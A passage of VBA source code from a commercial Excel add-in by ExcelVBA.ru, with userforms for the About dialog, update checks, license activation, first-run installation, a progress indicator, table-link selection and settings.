        Case Is < 10000: FileOrFolderSize = FormatNumber(Size / 1024, 1) & " KB"
        Case Is < 1000000: FileOrFolderSize = FormatNumber(Size \ 1024, 0) & " KB"
        Case Is < 10000000: FileOrFolderSize = FormatNumber(Size / 1024 / 1024, 1) & " MB"
        Case Is < 1000000000: FileOrFolderSize = FormatNumber(Size / 1024 / 1024, 0) & " MB"
        Case Else: FileOrFolderSize = FormatNumber(Size / 1024 / 1024 / 1024, 1) & " GB"
    End Select
End Function

Attribute VB_Name = "F_About"
Attribute VB_Base = "0{EFEC2334-F585-4F78-96BF-6797F5B6005C}{10652D30-4E37-46F7-97BB-32AE2083EECF}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_About                    Version: 20
' Author        : Igor Vakhnenko                   Date: 20.07.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit
Public StopEvents As Boolean
' Const HL_COLOR& = 16711680, HL_COLOR_ACTIVE& = 49152

Sub ComboBox_Language_Change()
    On Error Resume Next
    Set Me.Image_CurrentLanguage.Picture = Nothing
    Set Me.Image_CurrentLanguage.Picture = Me.Controls("Image_" & Me.ComboBox_Language).Picture
    Me.MultiPage1.SetFocus
    Me.HL_VersionsHistory.Enabled = Me.ComboBox_Language = "ru"
    Me.Label_HL_Cabinet.Enabled = Me.ComboBox_Language = "ru"

    If Me.ComboBox_Language = GetLanguage$ Then Exit Sub
    SetLanguage Me.ComboBox_Language
    CreateProgramCommandBar
    'TranslateUserForm Me
    UserForm_Initialize
End Sub

Private Sub CommandButton_InstallUpdate_Click()
    InstallUpdate
End Sub
Private Sub HL_VersionsHistory_Click()
    On Error Resume Next: FollowHyperlink VERSIONS_HISTORY_HYPERLINK$
End Sub

Private Sub Image_EF_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Me.MultiPage1.Pages("Page_RegInfo").Visible = True
End Sub

Private Sub Image_EF_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal Y As Single)
    On Error Resume Next
    If TrueDeveloper And (Button = 2) Then
        If Not Run(CFA_NAME$ & "Ready") Then MsgBox "CommonFunctions add-in is not available now", vbExclamation: Exit Sub
        Run CFA_NAME$ & "CreateAddInUpdate", PROJECT_NAME$, ThisWorkbook
        Unload Me
    End If
    If Button = 1 And Shift = 3 Then
        Dim small As Boolean: small = Me.Height < 300
        Me.Height = IIf(small, 308, 270): Me.MultiPage1.value = 0
    End If
End Sub

Private Sub Image_Main_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    On Error Resume Next: CreateProgramCommandBar
End Sub

Private Sub Label_HL_Cabinet_Click()
    On Error Resume Next
    If Not Request_("action=get_cabinet_url") Then FWF.FollowHyperlink CABINET_HYPERLINK$
End Sub

Sub UserForm_Initialize()
    On Error Resume Next: Me.StopEvents = True
    Me.TextBox_ProgramCodeName = PROJECT_NAME$: Me.Label_ProgramFullname = tt("ProgramFullname")
    Me.Caption = tt("MENU_ABOUT"): Me.TextBox_HID = HID$: Me.TextBox_HWID = HWID$
    Me.TextBox_email = SETT.GetRegValue("email")
    Me.Label_CurrVersionNumber1 = GetVersionTXT: Me.Label_CurrVersionNumber2 = GetVersionTXT
    Me.CheckBox_InstallUpdatesAutomatically.value = SETT.GetBoolean("AutoInstall", False, "Updates")
    Me.CheckBox_Autorun.value = AddinAutoRun

    Dim larr, i&, PROJECT_LASTYEAR&, BuiltDate As Date, picpath$
    larr = AvailableLanguagesArray
    For i = LBound(larr) To UBound(larr): larr(i, 2) = "     " & larr(i, 2): Next i
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = GetLanguage

    BuiltDate = CDate(Val(Replace(Split(ThisWorkbook.Names("BuiltDate").RefersTo, "%%")(1), ",", ".")))
    If BuiltDate > 42200 Then Me.Label_CurrVersionDate = Format(BuiltDate, "D MMM YYYY  HH:NN") & "  GMT+6" Else Me.Label_CurrVersionDate.Visible = False

    Me.Label_Copyright = Replace(Me.Label_Copyright, "YYYY", ProgramYears)
    Me.Label_SendEmail = IIf(RUS, SUPPORT_EMAIL_RUS$, SUPPORT_EMAIL$)

    '    Me.Label_RegHyperlink.ControlTipText = Split(BUY_NEW_HYPERLINK$, "&")(0)        ' Replace(BUY_NEW_HYPERLINK$$, "&", "&&")
    '    Me.Label_HL_BuyLicense.ControlTipText = Split(BUY_NEW_HYPERLINK$, "&")(0)        'Replace(BUY_NEW_HYPERLINK$, "&", "&&")
    '    Me.Label_ProgramWebPage.ControlTipText = Split(PROGRAM_HYPERLINK$, "?")(0)

    picpath$ = GetFile_MainPicture
    If picpath$ <> "" Then Set Me.Image_Main.Picture = LoadPicture(picpath$)
    If SETT.IsFirstRun Then RunWithDelay "ShowFirstRunForm": Unload Me: Exit Sub
    TranslateUserForm Me
    Me.MultiPage1.value = 0: MultiPage1_Change
    Me.StopEvents = False
End Sub

Private Sub CheckBox_Autorun_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    AddinAutoRun Me.CheckBox_Autorun.value
End Sub

Private Sub CheckBox_InstallUpdatesAutomatically_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    SETT.SetText "AutoInstall", Me.CheckBox_InstallUpdatesAutomatically, "Updates"
End Sub

Private Sub CommandButton_ActivateProgram_Click()
    Dim msg$, res As Boolean, code$
    code$ = Trim(Me.TextBox_ActivationCode)

    If code$ Like "%*%" Then
        EXECUTE_COMMANDS Split(code$, "%")(1), True
    Else
        If code$ Like "LANGUAGE ??" Then ActivateLanguage Split(code$)(1): Exit Sub
        ' 0 = switcher disabled, 1 = default type, 2 = DROPDOWN SWITCHER, 3 = BUTTON SWITCHER
        If code$ Like "SWITCHER #" Then SETT.SetText "SettingsSwitcher", Split(code$)(1), "Setup": CreateProgramCommandBar: Exit Sub
        
        If Not Request_("action=activation", "data=" & code$) Then
            MsgBox tt("FA_ACT_ConnectError"), vbCritical, PROJECT_NAME$
            Exit Sub
        End If
    End If
    'Me.MultiPage1.Value = 0
End Sub

Sub ActivateLanguage(ByVal lang$)
    On Error Resume Next: Dim larr, i&
    SetLanguage lang$
    larr = AvailableLanguagesArray
    For i = LBound(larr) To UBound(larr): larr(i, 2) = "     " & larr(i, 2): Next i
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = lang$
End Sub

Private Sub CommandButton_Uninstall_Click()
    UninstallThisFile 1        ' with confirmation
End Sub

Private Sub Label_RegHyperlink_Click()
    On Error Resume Next: Dim HL$: HL$ = BUY_NEW_HYPERLINK$
    If Len(HL$) Then FollowHyperlink HL$
End Sub

Private Sub TextBox_ActivationCode_Change()
    Me.CommandButton_ActivateProgram.Enabled = Len(Trim(Me.TextBox_ActivationCode)) > 0
End Sub

Sub MultiPage1_Change()
    On Error Resume Next
    If SETT.RSP(1) = "" Then RunWithDelay "ShowFirstRunForm": Unload Me: Exit Sub
    Select Case Me.MultiPage1.Pages(Me.MultiPage1.value).Name
        Case "Page_About"
            UpdateStatus Me.Label_Info
        Case "Page_RegInfo"
        Case "Page_Updates"
            CheckForUpdates
        Case "Page_Options"
    End Select
End Sub
Private Sub CommandButton_Close_Click(): Unload Me: End Sub

Private Sub Label_HL_BuyLicense_Click()
    FollowHyperlink IIf(Me.MultiPage1.Pages("Page_RegInfo").Visible, BUY_NEW_HYPERLINK$, BUY_ADD_HYPERLINK$ & "&email=" & SETT.GetRegValue("email"))
End Sub
Private Sub Label_ProgramWebPage_Click()
    On Error Resume Next: FollowHyperlink PROGRAM_HYPERLINK$
End Sub
Private Sub Label_SendEmail_Click()
    On Error Resume Next: FollowHyperlink "mailto:" & Me.Label_SendEmail & "?subject=" & PROJECT_NAME$ & "%20Support"
End Sub

Sub CheckForUpdates()
    On Error Resume Next
    Dim LastUpdateCheckTime As Date, LastUpdateCheckComment$
    Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Search.Picture
    Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_Searching")
    Me.CommandButton_InstallUpdate.Visible = False
    'Application.Wait Now + 1 / 86400

    LastUpdateCheckTime = CDate(SETT.GetText("LastCheck", 0, "Updates"))
    If Abs(LastUpdateCheckTime - CDbl(Now)) > 10 / 86400 Then
        Me.MultiPage1.Enabled = False
        If Not Request_("action=updates") Then
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Error.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_ConnectError")
            Me.MultiPage1.Enabled = True        ': SETT.SetText "LastCheck", Now, "Updates"
            Exit Sub
        End If
        Me.MultiPage1.Enabled = True
    End If

    LastUpdateCheckComment$ = SETT.GetText("LastCheckComment", "", "Updates")
    Select Case True
        Case LastUpdateCheckComment$ Like "Last version is installed*"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Last.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_LastVersionInstalled")

        Case LastUpdateCheckComment$ Like "Updates not found"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_NotFound.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_NotFound", PROJECT_NAME$)

        Case LastUpdateCheckComment$ Like "New version found*"
            Set Me.Image_UpdateStatus.Picture = Me.Image_UpdateStatus_Found.Picture
            Me.Label_CheckUpdatesStatus.Caption = tt("FA_UPD_Found") & " (" & SETT.GetText("NewVersion", 0, "Updates") & ")"
            Me.CommandButton_InstallUpdate.Visible = True
    End Select
End Sub
Attribute VB_Name = "F_FirstRun"
Attribute VB_Base = "0{9B7C2F85-EE54-4622-9936-2527775E72CE}{8392D917-962B-4C75-BFDE-17A66FC6D472}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_FirstRun                    Version: 2.2
' Author        : Igor Vakhnenko                   Date: 09.05.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text

Private Sub ComboBox_Language_Change()
    On Error Resume Next
    If SetLanguage(Me.ComboBox_Language) Then
        TranslateUserForm Me
        MultiPage_FirstRun_Change
        UpdateFields
    End If
End Sub

Private Sub CommandButton_Cancel_Click()
    Unload Me
End Sub

Sub UpdateFields()
    On Error Resume Next
    Me.TextBox_EULA.Text = tt("EULA content", "ExcelVBA.ru", ProgramYears)
    Me.TextBox_EULA.SelStart = 0
    Me.TextBox_EULA.SelLength = 0
    Me.Caption = tt("FirstRun_FormCaption")
    Me.Label_ProgramFullname = tt("ProgramFullname")
End Sub

Private Sub CommandButton_Action1_Click()
    On Error Resume Next: Me.MultiPage_FirstRun.value = Me.MultiPage_FirstRun.value - 1
End Sub

Sub InstallAddinToFolder(ByVal Folder$)
    On Error Resume Next
    If ThisWorkbook.Path = Folder$ Then Exit Sub
    If Not FWF.FolderExists(Folder$) Then Exit Sub
    Dim filename$, coll As Collection, file, WB As Workbook

    ' deleting old add-in versions from destination folder
    Set coll = FWF.FilenamesCollection(Folder$, PROJECT_NAME$ & "*." & FWF.GetFileExtension(ThisWorkbook.FullName), 1)
    For Each file In coll
        filename$ = Dir(file)
        If filename$ <> ThisWorkbook.Name Then
            Set WB = Nothing: Set WB = Workbooks(filename$)
            If Not WB Is Nothing Then WB.Close False
        End If
        SetAttr file, vbNormal
        Kill file
    Next

    filename$ = Folder$ & Application.PathSeparator & PROJECT_NAME$ & "." & FWF.GetFileExtension(ThisWorkbook.FullName)
    Application.DisplayAlerts = False
    ThisWorkbook.SaveAs filename$
    Application.DisplayAlerts = True
    Set coll = Nothing: Set WB = Nothing
End Sub

Private Sub CommandButton_Action2_Click()
    On Error Resume Next: Dim Email$, i As Boolean
    If Me.MultiPage_FirstRun.value = Me.MultiPage_FirstRun.Pages.Count - 1 Then
        With SETT
            InstallAddinToFolder Me.Label_DestinationFolder
            AddinAutoRun Me.CheckBox_Autorun.value
            i = .RSP(3) = ""
            If Me.CheckBox_AddShortcut Then CreateShortcutInStartMenu
            HWID True
            Email$ = Trim(Me.TextBox_ActivationCode)
            If .RSP(1) = "" Then .WSP 1, .DTU
            If Not Request_("action=first_run activation", "data=" & Email$) Then
                If Len(Email$) Then MsgBox tt("|46415F4143545F436F6E6E6563744572726F72"), vbCritical, PROJECT_NAME$
                If i Then .WSP 3, (.LastMacro + 1) * l0 + .LastMacro
            End If
        End With
        Run TWN & "FirstRunActions"
        If Me.CheckBox_ShowUsageExample.Visible Then If Me.CheckBox_ShowUsageExample Then RunWithDelay "ShowUsageExample", 0.5
        Unload Me
    End If
    Me.MultiPage_FirstRun.value = Me.MultiPage_FirstRun.value + 1
End Sub
Private Sub CommandButton_Action3_Click()
    SetupCancelled = True
    Unload Me
End Sub

Private Sub CommandButton_ChangeFolder_Click()
    On Error Resume Next: Dim Folder$
    Folder$ = FWF.GetFolderPath(, Me.Label_DestinationFolder)
    If Folder$ <> "" Then
        If Right(Folder$, 1) = Application.PathSeparator Then Folder$ = Left(Folder$, Len(Folder$) - 1)
        Me.Label_DestinationFolder = Folder$
    End If
End Sub

Private Sub Image_en_Click(): On Error Resume Next: Me.ComboBox_Language = "en": End Sub
Private Sub Image_ru_Click(): On Error Resume Next: Me.ComboBox_Language = "ru": End Sub
Private Sub Image_it_Click(): On Error Resume Next: Me.ComboBox_Language = "it": End Sub
Private Sub Image_de_Click(): On Error Resume Next: Me.ComboBox_Language = "de": End Sub
Private Sub Image_fr_Click(): On Error Resume Next: Me.ComboBox_Language = "fr": End Sub
Private Sub Image_es_Click(): On Error Resume Next: Me.ComboBox_Language = "es": End Sub
Private Sub Image_ar_Click(): On Error Resume Next: Me.ComboBox_Language = "ar": End Sub
Private Sub Image_jp_Click(): On Error Resume Next: Me.ComboBox_Language = "jp": End Sub

Sub MultiPage_FirstRun_Change()
    On Error Resume Next
    Dim arrButtonsCaption As Variant, param$, b_capt$, b_en As Boolean, b_vis As Boolean, i&
    arrButtonsCaption = Split(Me.MultiPage_FirstRun.Pages(Me.MultiPage_FirstRun.value).Tag, "/")
    For i = 1 To 3
        param$ = "": param$ = arrButtonsCaption(i - 1)
        b_capt$ = Replace(param$, "*", "")
        b_en = InStr(1, param$, "*") = 0
        b_vis = b_capt$ <> ""

        With Me.Controls("CommandButton_Action" & i)
            .Caption = tt(b_capt$)
            .Enabled = b_en
            .Visible = b_vis
        End With
    Next
    Me.CommandButton_Action2.SetFocus
End Sub

Private Sub TextBox_ActivationCode_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    Me.CommandButton_Action1.TabIndex = 5
End Sub

Function GetDestinationFolder() As String
    On Error Resume Next: Dim Folder$, downloads_folder$, changed As Boolean, v
    Const USF$ = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"
    downloads_folder$ = Replace(SETT.GetText("{374DE290-123F-4565-9164-39C4925E467B}", , USF$), "%USERPROFILE%", Environ("USERPROFILE"))
    Folder$ = ThisWorkbook.Path
    For Each v In Array(downloads_folder$, "Downloads", SETT.U("C7E0E3F0F3E7EAE8"))
        If InStr(1, Folder$, v, vbTextCompare) Then changed = True: Exit For
    Next
    GetDestinationFolder = IIf(changed, CreateObject("WScript.Shell").SpecialFolders("Desktop"), Folder$)
End Function

Private Sub UserForm_Initialize()
    On Error Resume Next: Dim i&, j&, larr, ctrl As Object, picpath$, LangImagesCount&
    SetupCancelled = False
    Me.Caption = PROJECT_NAME$
    If SETT.IsSettingBlank("Setup\Language") Then SetLanguage SYSTEM_LANGUAGE
    'If TrueDeveloper Then Me.MultiPage_FirstRun.Pages("Page4_Done").Tag = "Back/Done/"

    picpath$ = GetFile_MainPicture
    If picpath$ <> "" Then Set Me.Image_Main.Picture = LoadPicture(picpath$)

    TranslateUserForm Me
    UpdateFields

    Me.MultiPage_FirstRun.Style = fmTabStyleNone
    Me.MultiPage_FirstRun.value = 0
    MultiPage_FirstRun_Change

    larr = AvailableLanguagesArray
    Me.ComboBox_Language.list = larr
    Me.ComboBox_Language = GetLanguage
    If Me.ComboBox_Language.ListIndex = -1 Then Me.ComboBox_Language.ListIndex = 0
    If Me.ComboBox_Language.ListCount = 1 Then
        Me.MultiPage_FirstRun.value = 1
        Me.CommandButton_Action1.Visible = False
        Me.CommandButton_Action2.SetFocus
    End If

    For i = LBound(larr) To UBound(larr)
        If LangImagesCount& > 5 Then Exit For
        Set ctrl = Nothing: Set ctrl = Me.Controls("Image_" & larr(i, 1))
        If Not ctrl Is Nothing Then
            ctrl.ControlTipText = larr(i, 2)
            LangImagesCount& = LangImagesCount& + 1
            ctrl.Top = Me.ComboBox_Language.Top + 1
            ctrl.Left = Me.ComboBox_Language.Left + Me.ComboBox_Language.Width + 40 + (LangImagesCount& - 1) * 33
            ctrl.Visible = True
        End If
    Next i
    Me.Label_DestinationFolder.Caption = Me.GetDestinationFolder
    Me.CheckBox_ShowUsageExample.Visible = USAGE_EXAMPLE_EXISTS
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If CloseMode = 0 And Not TrueDeveloper Then Cancel = True
End Sub

Attribute VB_Name = "F_Progress"
Attribute VB_Base = "0{E6048795-FED3-4507-BC23-0AC833DB9D9D}{B83FE5FF-9B7E-4A69-B39D-1FEE6ADADBA9}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Progress                       Version: 2.2 (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser!)
' Author        : Igor Vakhnenko                   Date: 21.07.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Public Indicator As ProgressIndicator, ButtonMacro$
Dim MSG_StopMacro$, MSG_StopMacroTitle$

Private Sub UserForm_Initialize()
    On Error Resume Next
    MSG_StopMacro$ = Run(TWN & "tt", "PI_MSG_StopMacro")
    If MSG_StopMacro$ = "" Then MSG_StopMacro$ = "Do you really want to stop the macro?"
    MSG_StopMacroTitle$ = Run(TWN & "tt", "PI_MSG_StopMacroTitle")
    If MSG_StopMacroTitle$ = "" Then MSG_StopMacroTitle$ = "Processing is not complete yet"
    Err.Clear
End Sub

Private Sub CommandButton_RunMacro_Click()
    On Error Resume Next
    If Len(ButtonMacro$) Then Run TWN & ButtonMacro$
End Sub

Private Sub CommandButton_stop_Click()
    On Error Resume Next
    If StopMacro Then        ' macro finished
        End
    Else        ' macro is running
        If MsgBox(MSG_StopMacro$, vbQuestion + vbDefaultButton2 + vbYesNo, MSG_StopMacroTitle$) = vbYes Then
            StopMacro = True
        End If
    End If
End Sub

Private Sub SpinButton_log_Change()
    On Error Resume Next: Dim n&
    n = Me.SpinButton_log.value
    Me.Height = IIf(n = 0, 82, 92 + n * 40)
    Me.TextBox_Log.Height = 40 * n
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If Not Indicator Is Nothing Then Indicator.QueryClose
End Sub

Attribute VB_Name = "F_SelectTable"
Attribute VB_Base = "0{EC9040FB-A78F-45F5-AF3B-307711DDF2A1}{4E819622-E3DB-4A2E-9D69-10B90B0DD169}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub CheckBox_UsedRange_Click()
    On Error Resume Next
    Me.TextBox_Range.Enabled = Not Me.CheckBox_UsedRange.value
    Me.CommandButton_SelectRange.Enabled = Not Me.CheckBox_UsedRange.value

    If Me.CheckBox_UsedRange.value Then
        Me.TextBox_Range.Tag = Me.TextBox_Range.Text
        Me.TextBox_Range = ActiveSheet.UsedRange.Address(0, 0, xlA1)
        ActiveSheet.UsedRange.Select
    Else
        Me.TextBox_Range.Text = Me.TextBox_Range.Tag
        Application.ReferenceStyle = xlA1
        ActiveSheet.Range(Me.TextBox_Range).Select
    End If
End Sub

Private Sub ComboBox_Filename_Change()
    On Error Resume Next
    If Me.ComboBox_Filename = "" Then Exit Sub
    Workbooks(CStr(Me.ComboBox_Filename)).Activate
    Me.ComboBox_SheetName.Clear

    Dim sh As Worksheet
    For Each sh In ActiveWorkbook.Worksheets
        If sh.Visible = xlSheetVisible Then
            Me.ComboBox_SheetName.AddItem sh.Name
        End If
    Next sh
    Me.ComboBox_SheetName = ActiveSheet.Name
End Sub

Private Sub ComboBox_SheetName_Change()
    On Error Resume Next
    ActiveWorkbook.Worksheets(CStr(Me.ComboBox_SheetName)).Activate
    CheckFields
End Sub

Private Sub CommandButton_AddLink_Click()
    On Error Resume Next: Err.Clear
    Dim WB As Workbook, sh As Worksheet
    Set WB = Workbooks(CStr(Me.ComboBox_Filename))
    Set sh = WB.Worksheets(CStr(Me.ComboBox_SheetName))
    If WB Is Nothing Then Exit Sub
    If WB.Path = "" Then Exit Sub
    If sh Is Nothing Then Exit Sub

    RangeAddress$ = Me.TextBox_Range
    If Me.CheckBox_UsedRange Then RangeAddress$ = "UsedRange"

    filename$ = WB.FullName
    If filename$ Like TABLES_FOLDER$ & "*" Then filename$ = Split(filename$, TABLES_FOLDER$)(1)
    If filename$ = CellWithLink.Worksheet.Parent.FullName Then filename$ = ""
    Link$ = LINK_HEADER_TABLE$ & filename$ & "/" & sh.Name & "/" & RangeAddress$ & "/" & Me.ComboBox_InsertTableMode

    CellWithLink.value = Link$
    CellWithLink.Worksheet.Parent.Activate
    CellWithLink.Worksheet.Activate
    If Err = 0 Then Unload Me
End Sub

Private Sub CommandButton_OpenWokbook_Click()
    On Error Resume Next
    ChDrive Left(TABLES_FOLDER, 2)
    ChDir TABLES_FOLDER
    Application.Dialogs(xlDialogOpen).Show
    UpdateFilenamesList
End Sub

Private Sub CommandButton_Quit_Click()
    Unload Me
End Sub

Private Sub CommandButton_SelectRange_Click()
    On Error Resume Next
    Dim ra As Range, n As Name
    Set ra = Application.InputBox("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", , , , , , , 8)
    Me.TextBox_Range = ra.Address(0, 0, xlA1)
    For Each n In ra.Worksheet.Parent.Names
        If n.RefersToRange.Address = ra.Address Then Me.TextBox_Range = n.Name
    Next

    Me.ComboBox_Filename = ra.Worksheet.Parent.Name
    Me.ComboBox_SheetName = ra.Worksheet.Name
    ra.Select
End Sub

Private Sub TextBox_Range_Change()
    CheckFields
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    If CellWithLink Is Nothing Then Exit Sub
    UpdateFilenamesList
    Me.ComboBox_InsertTableMode.list = InsertTableStylesArray

    Link$ = CellWithLink.value
    If Link$ Like LINK_HEADER_TABLE$ & "*/*/*" Then
        Link$ = Split(Link$, LINK_HEADER_TABLE$)(1)

        InsertTableMode$ = Trim(Split(Link$, "/")(3))
        If InsertTableMode$ = "" Then InsertTableMode$ = "Excel"
        Me.ComboBox_InsertTableMode = InsertTableMode$


        filename$ = Split(Link$, "/")(0)
        If filename$ = "" Then
            filename$ = ActiveWorkbook.FullName
        Else
            If (Not filename$ Like "[A-Z]:\*") And (Not filename$ Like "\\*") Then
                filename$ = TABLES_FOLDER$ & filename$
            End If
        End If
        shortFilename$ = Dir(filename$, vbNormal)
        If Len(shortFilename$) Then
            If Not IsObject(Workbooks(CStr(shortFilename$))) Then
                Application.DisplayAlerts = False
                Workbooks.Open filename$
                Application.DisplayAlerts = True
            End If

            Err.Clear: Me.ComboBox_Filename = shortFilename$
            If Err Then Me.ComboBox_Filename.AddItem shortFilename$: Me.ComboBox_Filename = shortFilename$

            SheetName$ = Split(Link$, "/")(1)
            Err.Clear: Me.ComboBox_SheetName = SheetName$
            If Err Then Exit Sub


            RangeAddress$ = Split(Link$, "/")(2)
            If RangeAddress$ = "UsedRange" Then
                Me.CheckBox_UsedRange = True
            Else
                Me.TextBox_Range = RangeAddress$
            End If
            ActiveSheet.Range(Me.TextBox_Range).Select
        End If

    End If
End Sub

Sub UpdateFilenamesList()
    On Error Resume Next: Me.ComboBox_Filename.Clear
    Dim WB As Workbook
    For Each WB In Application.Workbooks
        If WB.Windows(1).Visible = True And WB.Path <> "" Then
            Me.ComboBox_Filename.AddItem WB.Name
        End If
    Next WB
    Me.ComboBox_Filename = ActiveWorkbook.Name
End Sub

Sub CheckFields()
    On Error Resume Next
    Me.CommandButton_AddLink.Enabled = Me.ComboBox_SheetName <> "" And Me.ComboBox_Filename <> "" And Me.TextBox_Range <> ""
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If CellWithLink Is Nothing Then Exit Sub
    CellWithLink.Worksheet.Parent.Activate
    CellWithLink.Worksheet.Activate
    CellWithLink.Select
    Set ThisWorkbook.app = Application
End Sub
Attribute VB_Name = "F_Settings"
Attribute VB_Base = "0{68ABA030-C24B-47D3-BFB5-441203F3B0BE}{CC061897-0319-4A12-A700-7415F6F3CB48}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Settings
' Author        : EducatedFool                     Date: 06.06.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/         Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Public SpecialControlsCollection As Collection

Private Sub CheckBox_AddHyperlinks_Click()
    On Error Resume Next: Err.Clear
    Me.Label_HLink_Text.Enabled = Me.CheckBox_AddHyperlinks
    Me.TextBox_HyperlinkText.Enabled = Me.CheckBox_AddHyperlinks
End Sub

Private Sub CheckBox_AddSendMarkIntoRow_Click()
    On Error Resume Next
    Me.ComboBox_SendMark_Column.Enabled = Me.CheckBox_AddSendMarkIntoRow
    Me.ScrollBar_SendMark.Enabled = Me.CheckBox_AddSendMarkIntoRow
End Sub

Private Sub CheckBox_AddSendTimeIntoRow_Click()
    On Error Resume Next
    Me.ComboBox_SendTime_Column.Enabled = Me.CheckBox_AddSendTimeIntoRow
    Me.ScrollBar_SendTime.Enabled = Me.CheckBox_AddSendTimeIntoRow
End Sub

Private Sub CheckBox_Mail_AttachCreatedFiles_Click()
    On Error Resume Next: Err.Clear
    Me.CheckBox_Mail_AttachCreatedFiles.Font.Bold = Me.CheckBox_Mail_AttachCreatedFiles
    Me.Label_AttachCreatedFiles.Enabled = Me.CheckBox_Mail_AttachCreatedFiles
    Me.TextBox_AttachCreatedFilesMask.Enabled = Me.CheckBox_Mail_AttachCreatedFiles
End Sub

Private Sub CheckBox_Mail_AttachStaticFiles_Click()
    On Error Resume Next: Err.Clear
    Me.CheckBox_Mail_AttachStaticFiles.Font.Bold = Me.CheckBox_Mail_AttachStaticFiles
    Me.TextBox_Mail_AttachStaticFolder.Enabled = Me.CheckBox_Mail_AttachStaticFiles
    Me.CommandButton_Change_AttachStaticFolder.Enabled = Me.CheckBox_Mail_AttachStaticFiles

    Me.TextBox_Mail_AttachStaticFolder.BackColor = IIf(Me.CheckBox_Mail_AttachStaticFiles, vbWindowBackground, vbButtonFace)
End Sub

Private Sub CheckBox_MultiRow_Click()
    On Error Resume Next
    Me.CheckBox_Multirow_GroupRows.Enabled = Me.CheckBox_MultiRow
    Me.ComboBox_Multirow_GroupColumn.Visible = Me.CheckBox_MultiRow
    Me.Label_Multirow_GroupColumn.Visible = Me.CheckBox_MultiRow
    Me.ScrollBar_Multirow.Visible = Me.CheckBox_MultiRow
End Sub

Private Sub CheckBox_Multirow_GroupRows_Click()
    On Error Resume Next
    Me.ComboBox_Multirow_GroupColumn.Enabled = Me.CheckBox_Multirow_GroupRows
    Me.Label_Multirow_GroupColumn.Enabled = Me.CheckBox_Multirow_GroupRows
    Me.ScrollBar_Multirow.Enabled = Me.CheckBox_Multirow_GroupRows
End Sub

Private Sub CheckBox_Multirow_InsertPageBreaks_Click()
    On Error Resume Next: Me.CheckBox_Multirow_InsertPageBreaksAfterSecondRow.Enabled = Me.CheckBox_Multirow_InsertPageBreaks.value
End Sub

Private Sub CheckBox_SendEmail_Click()
    On Error Resume Next: Err.Clear
    Me.MultiPage_Options.Pages("Page_SendMail").Visible = Me.CheckBox_SendEmail
    Me.Label_SendEmail.Visible = Me.CheckBox_SendEmail
End Sub



Private Sub CheckBox_SpecifiedTemplateWorksheets_Click()
    On Error Resume Next: Me.TextBox_SpecifiedTemplateWorksheets.Enabled = Me.CheckBox_SpecifiedTemplateWorksheets.value
End Sub

Private Sub CheckBox_TemplatesFilter_Enabled_Click()
    On Error Resume Next
    Me.ComboBox_TemplatesFilter_Column.Enabled = Me.CheckBox_TemplatesFilter_Enabled.value
    Me.ScrollBar_TemplatesFilter.Enabled = Me.CheckBox_TemplatesFilter_Enabled.value
End Sub

Private Sub CheckBox_UseAllRows_Click()
    On Error Resume Next: Me.CheckBox_UseAllRows.Font.Bold = Me.CheckBox_UseAllRows.value
End Sub

Sub CommandButton_Change_AttachStaticFolder_Click()
    On Error Resume Next: Err.Clear
